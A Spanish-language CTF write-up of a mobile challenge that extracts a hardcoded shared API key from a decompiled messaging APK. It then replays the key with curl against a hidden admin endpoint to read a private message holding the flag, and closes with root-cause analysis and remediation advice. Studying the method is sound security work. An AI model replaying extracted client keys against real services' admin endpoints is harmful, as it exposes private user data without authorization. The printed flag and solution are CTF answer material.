# Write-up — Whispers in the Wire

| | |
|---|---|
| **CTF** | FluidAttacks CTF 2026 |
| **Categoría** | Mobile |
| **Dificultad** | Easy |
| **Puntos** | 100 |
| **Flag** | `flag{6cce60a62144520c}` |
| **Vulnerabilidad** | Broken Access Control — endpoint admin protegido solo por API key compartida hardcodeada |

---

## 1. Enunciado

> WhisperChat is the messaging app the office runs on. Here's the decompiled APK
> and a little Python client that talks to its backend.

Adjunto: `public.zip` (cifrado AES, contraseña `infected`) con el APK decompilado
de WhisperChat + un cliente Python (`whisper_client.py`). Más una instancia del
backend desplegada en `https://857159d15e9decbd.chal.ctf.ae`.

---

## 2. Abriendo el adjunto

El ZIP usa cifrado AES de WinZip (método de compresión 99), que `unzip` no soporta
("unsupported compression method 99"). Se abre con `7z` o, como aquí, con `pyzipper`:

```python
import pyzipper
with pyzipper.AESZipFile("public.zip") as z:
    z.pwd = b"infected"
    z.extractall("extracted")
```

Contenido:

```
WhisperChat/AndroidManifest.xml
WhisperChat/res/values/strings.xml
WhisperChat/sources/com/whisperchat/app/data/ApiClient.java
WhisperChat/sources/com/whisperchat/app/data/WhisperApi.java
WhisperChat/sources/com/whisperchat/app/model/{Message,MessageList,Session}.java
WhisperChat/sources/com/whisperchat/app/ui/SettingsActivity.java
whisper_client.py
```

---

## 3. Análisis estático

### 3.1 API key compartida hardcodeada

Tanto el cliente Python como el APK llevan la misma credencial embebida:

```python
# whisper_client.py
API_KEY = "fluidctf-api-2026-whispers"
HEADERS = {"X-API-Key": API_KEY, ...}
```
```xml
<!-- strings.xml -->
<string name="api_key">fluidctf-api-2026-whispers</string>
```
```java
// ApiClient.java — la key se añade a TODA petición vía interceptor
private static final String API_KEY = "fluidctf-api-2026-whispers";
...
.header("X-API-Key", API_KEY)
```

### 3.2 El endpoint que la UI no usa

`WhisperApi.java` (interfaz Retrofit) declara **todas** las rutas del backend,
incluida una que la app normal no invoca:

```java
/* Admin console feed: every channel, including private staff threads.
 * Reached from SettingsActivity only when the account is staff, but the
 * call carries the same shared API key as everything else. */
@GET("api/admin/messages")
Call<MessageList> getAdminMessages();
```

### 3.3 El control de acceso es solo cosmético

`SettingsActivity.java` y `Session.java` describen el fallo con todas las letras:

```java
// SettingsActivity: el botón admin se oculta según isAdmin(), pero...
// "the backend never checks anything beyond the shared API key, so the
//  route it opens is reachable by anyone replaying that key."
adminEntry.setVisibility(Session.current().isAdmin() ? VISIBLE : GONE);
```
```java
// Session.java
/* The isAdmin() flag only toggles UI; the server does not consult it,
 * which is the whole problem. */
```

**Conclusión:** `GET /api/admin/messages` no exige rol de administrador; le basta la
API key compartida que ya viene en el APK. Es un control de acceso implementado solo
en el cliente (client-side gating).

---

## 4. Explotación

Se replica la API key extraída del APK contra el endpoint admin del backend:

```bash
curl -s https://857159d15e9decbd.chal.ctf.ae/api/admin/messages \
     -H 'X-API-Key: fluidctf-api-2026-whispers'
```

La respuesta incluye un mensaje que el feed normal (`/api/messages`, 4 mensajes) no
muestra — un hilo privado `admin -> ops` con `"private": true`:

```json
{"count":5,"messages":[
  {"sender":"admin","recipient":"ops","private":true,
   "timestamp":"2026-04-09T18:42:00Z",
   "body":"Vault recovery code for Q2: flag{6cce60a62144520c}"},
  ... (los 4 mensajes públicos) ...
]}
```

---

## 5. Flag

```
flag{6cce60a62144520c}
```

---

## 6. Causa raíz y remediación

**Causa raíz:** autorización basada en el cliente. El servidor confunde
*autenticación* (una API key válida) con *autorización* (permiso para leer el feed
admin). Como la key es única, compartida y va embebida en un APK distribuible,
cualquiera puede extraerla y asumir privilegios que la UI pretendía ocultar. El
`isAdmin()` del cliente no protege nada: la seguridad que solo existe en la app se
evade hablando con la API directamente.

**Cómo se arregla:**

- **Autorizar en el servidor por identidad y rol**, no por posesión de una key
  compartida. Cada usuario debe tener credenciales propias (token con claim de rol)
  y `/api/admin/*` debe verificar ese rol en el backend.
- **Nunca embeber secretos de larga vida en el cliente.** Un APK es código público;
  toda constante allí (keys, endpoints internos) se considera comprometida.
- **No confiar en ocultar la UI.** Esconder un botón o no cablear una ruta en la app
  no impide llamarla; la superficie real es el API, no la pantalla.
- **Segregar datos por sensibilidad**: los hilos privados/ops no deberían devolverse
  a una petición que no acredite pertenecer a ese grupo.

**Lección de CTF (Mobile):** decompila y lee **todas** las rutas declaradas (aquí,
la interfaz Retrofit), no solo las que la UI usa. Los endpoints "muertos" y los
secretos hardcodeados en `strings.xml` / clases de red son el camino más corto.
